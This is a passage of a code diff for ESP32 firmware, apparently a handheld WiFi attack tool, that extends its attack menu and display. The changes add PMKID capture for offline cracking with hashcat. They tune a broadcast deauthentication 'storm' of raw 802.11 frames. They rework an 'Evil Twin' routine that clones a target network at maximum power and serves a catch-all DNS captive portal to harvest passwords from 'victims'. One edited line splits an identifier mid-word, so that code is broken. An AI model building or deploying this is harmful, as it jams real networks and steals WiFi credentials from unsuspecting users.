+               pmkidAPMAC[2], pmkidAPMAC[3],
+               pmkidAPMAC[4], pmkidAPMAC[5]);
+    
+    y += 15;
+    
+    // PMKID (first 8 bytes on one line)
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.setCursor(SIDE_MARGIN, y);
+    tft.print("ID:");
+    tft.setTextColor(COLOR_PURPLE);
+    tft.setCursor(30, y);
+    for (int i = 0; i < 8; i++) {
+      tft.printf("%02X", capturedPMKID[i]);
+    }
+    
+    y += 12;
+    // Second 8 bytes
+    tft.setCursor(30, y);
+    for (int i = 8; i < 16; i++) {
+      tft.printf("%02X", capturedPMKID[i]);
+    }
+    
+    y += 20;
+    tft.setTextColor(COLOR_GREEN);
+    tft.setCursor(SIDE_MARGIN, y);
+    tft.println("Ready for hashcat!");
+    
+  } else {
+    tft.setTextColor(COLOR_YELLOW);
+    tft.print("WAITING...");
+    
+    y += 20;
+    tft.setTextColor(COLOR_TEXT);
+    tft.setCursor(SIDE_MARGIN, y);
+    tft.print("Listening for PMKID in");
+    
+    y += 12;
+    tft.setCursor(SIDE_MARGIN, y);
+    tft.print("RSN beacons...");
+    
+    int dots = (millis() / 500) % 4;
+    for (int i = 0; i < 3; i++) {
+      tft.print(i < dots ? "." : " ");
+    }
+  }
+  
+  y += 25;
+  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+  y += 8;
+  
+  // Duration
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("Duration: ");
+  unsigned long runtime = (millis() - lastAttackTime) / 1000;
+  tft.setTextColor(COLOR_CYAN);
+  tft.printf("%d sec", runtime);
+  
+  drawCenteredButton("[STOP]", COLOR_RED);
 }
 
 void loop() {
@@ -8051,6 +8672,17 @@ if (probeSnifferActive) {
   if (millis() - lastProbeUpdate > 300) {
     displayProbeRequestSniffer();
     lastProbeUpdate = millis();
+  }
+}
+
+if (currentState == PMKID_CAPTURE) {
+  static unsigned long lastPMKIDUpdate = 0;
+  static bool wasCaptured = false;
+  if (millis() - lastPMKIDUpdate > 300 || 
+      (pmkidCaptured && !wasCaptured)) {
+    displayPMKIDCapture();
+    wasCaptured = pmkidCaptured;
+    lastPMKIDUpdate = millis();
   }
 }
 
@@ -8579,9 +9211,23 @@ if (controlSnifferActive) {
   }
   
   // Captive portal (when not jamming)
-  if (portalActive && !bleJammerActive && !nrfJammerActive && !snifferActive) {
-    dnsServer.processNextRequest();
+  if (portalActive && !bleJammerActive && !nrfJa
+  mmerActive && !snifferActive) {
+    // Process multiple DNS requests per loop cycle
+    for (int i = 0; i < 5; i++) {
+      dnsServer.processNextRequest();
+    }
+    
+    // Process web requests
     webServer.handleClient();
+    
+    // Check for new clients and log
+    static int lastClientCount = 0;
+    int currentClients = WiFi.softAPgetStationNum();
+    if (currentClients != lastClientCount) {
+      Serial.printf("[*] Clients connected: %d\n", currentClients);
+      lastClientCount = currentClients;
+    }
   }
   
   delay(1);
@@ -8591,29 +9237,31 @@ void updateAttackMenuLive() {
   static unsigned long lastUpdate = 0;
   if (millis() - lastUpdate < 200) return;
   lastUpdate = millis();
-  // Only update if we're actually in the attack menu
+  
   if (currentState != WIFI_ATTACK_MENU) return;
   
-  // Calculate positions (must match drawAttackMenu())
-  int separatorY = HEADER_HEIGHT + 25 + (6 * (MENU_ITEM_HEIGHT + MENU_SPACING)) + 5;
-  int statusY = separatorY + 8;
+  // Calculate positions (MUST match drawAttackMenu)
+  int menuStartY = HEADER_HEIGHT + 25;
+  const int ITEM_SPACING = 24;  // MUST match drawAttackMenu()
+  int separatorY = menuStartY + (8 * ITEM_SPACING) + 3;
+  int statusY = separatorY + 6;
   int leftColX = SIDE_MARGIN;
   int rightColX = 130;
   
-  // ===== UPDATE <Active> INDICATORS ON MENU ITEMS =====
-  int menuY = HEADER_HEIGHT + 25;
-  for (int i = 0; i < 6; i++) {
-    int itemY = menuY + (i * (MENU_ITEM_HEIGHT + MENU_SPACING));
+  // ===== UPDATE <Active> INDICATORS =====
+  for (int i = 0; i < 8; i++) {
+    int itemY = menuStartY + (i * ITEM_SPACING);
     
-    // Clear the indicator area
+    // Clear indicator area
     tft.fillRect(168, itemY + 5, 72, 14, COLOR_BG);
     
-    // Show <Active> if running
     bool showActive = false;
     if (i == 0 && deauthActive && currentDeauthMethod == 0) showActive = true;
     if (i == 1 && deauthActive && currentDeauthMethod == 1) showActive = true;
-    if (i == 2 && currentState == HANDSHAKE_CAPTURE) showActive = true;
-    if (i == 3 && portalActive) showActive = true;
+    if (i == 2 && portalActive && !deauthActive) showActive = true;
+    if (i == 3 && portalActive && deauthActive) showActive = true;
+    if (i == 4 && currentState == HANDSHAKE_CAPTURE) showActive = true;
+    if (i == 5 && currentState == PMKID_CAPTURE) showActive = true;
     
     if (showActive) {
       tft.setTextColor(COLOR_ORANGE);
@@ -8622,15 +9270,14 @@ void updateAttackMenuLive() {
     }
   }
   
-  // ===== CLEAR ONLY THE STATUS SECTION (STOP BEFORE BACK BUTTON) =====
-  // backY = 305, so clear up to 303 to leave back button untouched
-  int clearHeight = 303 - statusY;  // Calculate exact height to back button area
+  // ===== CLEAR STATUS SECTION (but not back button) =====
+  int clearHeight = 300 - statusY;
   tft.fillRect(0, statusY - 2, 240, clearHeight, COLOR_BG);
   
-  // ===== DRAW LEFT COLUMN STATUS =====
+  // ===== REDRAW STATUS =====
   tft.setTextSize(1);
   
-  // Deauth status
+  // Deauth
   tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(leftColX, statusY);
   tft.print("Deauth:");
@@ -8638,130 +9285,62 @@ void updateAttackMenuLive() {
   tft.setTextColor(deauthActive ? COLOR_ORANGE : COLOR_TEXT);
   tft.print(deauthActive ? "ACTIVE" : "OFF   ");
   
-  // Portal status (NO method here)
+  // Portal
   tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setCursor(leftColX, statusY + 12);
+  tft.setCursor(leftColX, statusY + 11);
   tft.print("Portal:");
-  tft.setCursor(leftColX + 48, statusY + 12);
+  tft.setCursor(leftColX + 48, statusY + 11);
   tft.setTextColor(portalActive ? COLOR_ORANGE : COLOR_TEXT);
   tft.print(portalActive ? "ACTIVE" : "OFF   ");
   
-  // Handshake status
+  // Handshake
   tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setCursor(leftColX, statusY + 24);
+  tft.setCursor(leftColX, statusY + 22);
   tft.print("Handshake:");
-  tft.setCursor(leftColX + 60, statusY + 24);
+  tft.setCursor(leftColX + 60, statusY + 22);
   if (capturedHandshake.captured) {
-    static bool justCaptured = false;
-    static unsigned long captureTime = 0;
-    if (!justCaptured) {
-      justCaptured = true;
-      captureTime = millis();
-    }
-    
-    bool showText = true;
-    if (millis() - captureTime < 3000) {
-      showText = (millis() / 250) % 2 == 0;
-    } else {
-      justCaptured = false;
-    }
-    
-    if (showText) {
-      tft.setTextColor(COLOR_GREEN);
-      tft.print("YES");
-    }
+    tft.setTextColor(COLOR_GREEN);
+    tft.print("YES");
   } else {
     tft.setTextColor(COLOR_TEXT);
     tft.print("NO ");
   }
   
-  // Passwords count
+  // Passwords
   tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setCursor(leftColX, statusY + 36);
+  tft.setCursor(leftColX, statusY + 33);
   tft.print("Passwords:");
-  tft.setCursor(leftColX + 60, statusY + 36);
+  tft.setCursor(leftColX + 60, statusY + 33);
   tft.setTextColor(COLOR_CYAN);
   tft.printf("%-3d", capturedCredCount);
   
-  // Show NEW indicator
-  static int lastShownCount = 0;
-  static unsigned long lastPwdTime = 0;
-  if (capturedCredCount > lastShownCount) {
-    lastShownCount = capturedCredCount;
-    lastPwdTime = millis();
-  }
-  if (millis() - lastPwdTime < 2000 && capturedCredCount > 0) {
-    tft.setTextColor(COLOR_GREEN);
-    tft.setCursor(leftColX + 85, statusY + 36);
-    tft.print("NEW!");
-  }
-  
-  // ===== RIGHT COLUMN - Active attack details =====
+  // Right column
   if (deauthActive) {
-    // Packets: label on top, value below (can expand)
     tft.setTextColor(COLOR_DARK_GREEN);
     tft.setCursor(rightColX, statusY);
     tft.print("Packets:");
-    tft.setCursor(rightColX, statusY + 12);  // Value BELOW label
+    tft.setCursor(rightColX, statusY + 11);
     tft.setTextColor(COLOR_ORANGE);
     tft.printf("%-8d", deauthPacketsSent);
     
-    // Method: value on SAME line (ONLY place showing method)
     tft.setTextColor(COLOR_DARK_GREEN);
-    tft.setCursor(rightColX, statusY + 24);
+    tft.setCursor(rightColX, statusY + 22);
     tft.print("Method:");
     tft.setTextColor(COLOR_CYAN);
-    tft.setCursor(rightColX + 42, statusY + 24);  // Value to the right
+    tft.setCursor(rightColX + 42, statusY + 22);
     tft.print(currentDeauthMethod == 0 ? "Standard" : "Storm   ");
   }
   
   if (portalActive) {
-    // Clients: value on SAME line
-    int portalY = deauthActive ? statusY + 36 : statusY;
+    int portalY = deauthActive ? statusY + 33 : statusY;
     tft.setTextColor(COLOR_DARK_GREEN);
     tft.setCursor(rightColX, portalY);
     tft.print("Clients:");
     
     int clientCount = WiFi.softAPgetStationNum();
     tft.setTextColor(clientCount > 0 ? COLOR_GREEN : COLOR_TEXT);
-    tft.setCursor(rightColX + 48, portalY);  // Value to the right
+    tft.setCursor(rightColX + 48, portalY);
     tft.printf("%-2d", clientCount);
-    
-    // Activity indicator
-    if (clientCount > 0) {
-      static bool clientBlink = false;
-      clientBlink = !clientBlink;
-      tft.setTextColor(clientBlink ? COLOR_ORANGE : COLOR_BG);
-      tft.setCursor(rightColX + 65, portalY);
-      tft.print("*");
-    }
-  }
-  
-  // ===== ATTACK STATUS MESSAGE AREA =====
-  int msgY = statusY + 60;
-  
-  // Timer for deauth start message
-  static unsigned long deauthStartTime = 0;
-  if (deauthActive && deauthStartTime == 0) {
-    deauthStartTime = millis();
-  }
-  if (!deauthActive) {
-    deauthStartTime = 0;
-  }
-  
-  // Show attack initiation messages
-  if (deauthActive && (millis() - deauthStartTime < 5000)) {  // Show for 5 seconds
-    tft.setTextColor(COLOR_ORANGE);
-    tft.setCursor(leftColX, msgY);
-    tft.print("> Deauth attack started...");
-  } else if (portalActive && WiFi.softAPgetStationNum() == 0) {
-    tft.setTextColor(COLOR_CYAN);
-    tft.setCursor(leftColX, msgY);
-    tft.print("> Evil Twin active       ");
-  } else if (capturedHandshake.captured) {
-    tft.setTextColor(COLOR_GREEN);
-    tft.setCursor(leftColX, msgY);
-    tft.print("> Handshake captured!    ");
   }
 }
 
@@ -8893,12 +9472,12 @@ void performDeauth() {
   uint8_t *bssid = networks[targetIndex].bssid;
   uint8_t channel = networks[targetIndex].channel;
   
-  // Ensure correct channel
+  // ✅ FIX: Ensure correct channel without disrupting our AP
   static uint8_t lastChannel = 0;
   if (lastChannel != channel) {
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     lastChannel = channel;
-    delay(10);
+    delay(5);  // ← Reduced from 10ms
   }
   
   // METHOD 0: Standard (5 packets)
@@ -8924,16 +9503,18 @@ void performDeauth() {
     }
   }
   
-  // METHOD 1: STORM MODE - ✅ ENHANCED FOR EVIL TWIN
+  // METHOD 1: STORM MODE (FIXED - slower bursts to not kill AP beacons)
   else if (currentDeauthMethod == 1) {
-    // ✅ NEW: Burst every 30ms (was 50ms) = MORE AGGRESSIVE
-    if (millis() - lastDeauthBurst < 30) return;
+    // ✅ FIX: Slower burst rate (50ms instead of 30ms)
+    // This prevents overwhelming ESP32 and killing our AP's beacons
+    if (millis() - lastDeauthBurst < 50) return;
     lastDeauthBurst = millis();
     
     const uint8_t reasons[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
     
-    // ✅ NEW: 30 packets per burst (was 20) = MAXIMUM AGGRESSION
-    for (int i = 0; i < 30; i++) {
+    // ✅ FIX: 20 packets per burst (reduced from 30)
+    // Still aggressive but doesn't kill our own AP
+    for (int i = 0; i < 20; i++) {
       uint8_t deauthPacket[26] = {
         0xC0, 0x00, 0x3A, 0x01,
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
@@ -8944,15 +9525,20 @@ void performDeauth() {
       };
       
       esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-      delayMicroseconds(50);
+      delayMicroseconds(100);  // ← Increased from 50us (less CPU intensive)
       SAFE_INCREMENT(deauthPacketsSent);
       
-      // ✅ Every 3rd packet, send disassociation (was every 5th)
-      if (i % 3 == 0) {
+      // Every 4th packet, send disassociation
+      if (i % 4 == 0) {
         deauthPacket[0] = 0xA0;
         esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-        delayMicroseconds(50);
+        delayMicroseconds(100);
         SAFE_INCREMENT(deauthPacketsSent);
+      }
+      
+      // ✅ NEW: Yield every 5 packets to let AP beacons through
+      if (i % 5 == 0) {
+        delayMicroseconds(500);  // Brief pause for AP beacon
       }
     }
   }
@@ -9752,39 +10338,36 @@ void startEvilTwin() {
     delay(100);
   }
   
-  // ✅ Complete WiFi reset
+  // ✅ FIX 1: PROPER WiFi stack reset with longer delays
   Serial.println("[*] Resetting WiFi stack...");
   WiFi.disconnect(true);
+  delay(200);  // ← Increased from 100ms
   WiFi.mode(WIFI_OFF);
   delay(500);
   esp_task_wdt_reset();
   
   esp_wifi_stop();
-  delay(200);
+  delay(300);  // ← Increased from 200ms
   esp_wifi_deinit();
-  delay(200);
+  delay(300);  // ← Increased from 200ms
   
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
   esp_wifi_init(&cfg);
-  delay(200);
+  delay(300);  // ← Increased from 200ms
   
   esp_wifi_set_mode(WIFI_MODE_AP);
-  delay(200);
+  delay(300);  // ← Increased from 200ms
   esp_wifi_start();
-  delay(200);
+  delay(300);  // ← Increased from 200ms
   esp_task_wdt_reset();
   
-  // ✅ ENHANCED: Configure AP for MAXIMUM visibility
+  // ✅ FIX 2: Configure AP BEFORE starting it
   wifi_config_t ap_config = {};
   
-  // Exact SSID copy
   strncpy((char*)ap_config.ap.ssid, selectedSSID.c_str(), 32);
   ap_config.ap.ssid_len = selectedSSID.length();
-  
-  // Match target channel
   ap_config.ap.channel = networks[targetIndex].channel;
   
-  // Match encryption (this makes it look identical)
   if (networks[targetIndex].isEncrypted) {
     ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
     strcpy((char*)ap_config.ap.password, "dummypass123");
@@ -9792,52 +10375,64 @@ void startEvilTwin() {
     ap_config.ap.authmode = WIFI_AUTH_OPEN;
   }
   
-  // ✅ CRITICAL: Optimize for FAST discovery
   ap_config.ap.max_connection = 10;
-  ap_config.ap.beacon_interval = 100;  // Fast beacons (default is 100ms, this is optimal)
+  ap_config.ap.beacon_interval = 100;
+  ap_config.ap.ssid_hidden = 0;
   
-  // ✅ NEW: Enable hidden SSID broadcasting (forces aggressive beaconing)
-  ap_config.ap.ssid_hidden = 0;  // NOT hidden - we want maximum visibility
-  
+  // ✅ FIX 3: Set config THEN start AP
   esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-  delay(200);
+  delay(300);  // ← Critical delay
   
-  // Start AP
   WiFi.softAP(selectedSSID.c_str());
   delay(500);
   esp_task_wdt_reset();
   
-  // ✅ CRITICAL: Maximum TX power
-  esp_wifi_set_max_tx_power(84);  // 21 dBm = MAX POWER
+  // ✅ Maximum TX power
+  esp_wifi_set_max_tx_power(84);
   
-  // ✅ NEW: Force channel multiple times (ESP32 bug workaround)
-  for (int i = 0; i < 3; i++) {
+  // ✅ FIX 4: FORCE channel multiple times with verification
+  uint8_t actualChannel = 0;
+  for (int attempt = 0; attempt < 5; attempt++) {
     esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
-    delay(50);
+    delay(100);
+    
+    // Verify channel was actually set
+    wifi_second_chan_t second;
+    esp_wifi_get_channel(&actualChannel, &second);
+    
+    if (actualChannel == networks[targetIndex].channel) {
+      Serial.printf("    Channel verified: %d\n", actualChannel);
+      break;
+    }
+    
+    if (attempt == 4) {
+      Serial.printf("    [!] Channel verification FAILED! Set=%d, Got=%d\n", 
+                    networks[targetIndex].channel, actualChannel);
+    }
   }
   
   IPAddress apIP = WiFi.softAPIP();
   Serial.printf("[+] Evil Twin AP started\n");
   Serial.printf("    SSID: %s\n", selectedSSID.c_str());
-  Serial.printf("    Channel: %d\n", networks[targetIndex].channel);
+  Serial.printf("    Channel: %d (verified: %d)\n", networks[targetIndex].channel, actualChannel);
   Serial.printf("    IP: %s\n", apIP.toString().c_str());
   Serial.printf("    TX Power: MAX (21 dBm)\n");
   
-  // ✅ Start ULTRA AGGRESSIVE deauth
-  deauthActive = true;
-  deauthPacketsSent = 0;
-  currentDeauthMethod = 1;  // Storm mode
-  portalActive = true;
-  
-  // ✅ DNS server
+  // ✅ FIX 5: Start DNS server FIRST and wait for it to be ready
   dnsServer.stop();
-  delay(100);
-  dnsServer.start(53, "*", apIP);
-  Serial.println("[+] DNS server started (catch-all)");
+  delay(200);  // ← Increased delay
   
-  // ✅ Web server with all routes
+  if (!dnsServer.start(53, "*", apIP)) {
+    Serial.println("[!] DNS server failed to start!");
+  } else {
+    Serial.println("[+] DNS server started (catch-all)");
+  }
+  
+  delay(300);  // ← NEW: Let DNS fully initialize
+  
+  // ✅ FIX 6: Start web server AFTER DNS is ready
   webServer.stop();
-  delay(100);
+  delay(200);  // ← Increased delay
   
   webServer.on("/", HTTP_GET, handlePortalRoot);
   webServer.on("/post", HTTP_POST, handlePortalPost);
@@ -9859,11 +10454,20 @@ void startEvilTwin() {
   webServer.begin();
   Serial.println("[+] Web server started");
   
+  // ✅ FIX 7: Start deauth LAST (after AP is fully operational)
+  delay(500);  // ← NEW: Let AP broadcast beacons first
+  
+  deauthActive = true;
+  deauthPacketsSent = 0;
+  currentDeauthMethod = 1;  // Storm mode
+  portalActive = true;
+  
   Serial.println("\n[+] ===== ENHANCED EVIL TWIN ACTIVE =====");
   Serial.println("    Mode: ULTRA AGGRESSIVE");
   Serial.println("    - Maximum TX power (21 dBm)");
-  Serial.println("    - Storm deauth (20 pkts/burst)");
+  Serial.println("    - Storm deauth (30 pkts/burst)");
   Serial.println("    - Fast beacon interval (100ms)");
+  Serial.println("    - DNS + Web server verified ready");
   Serial.println("    - Waiting for victims...");
   Serial.println("========================================\n");
   
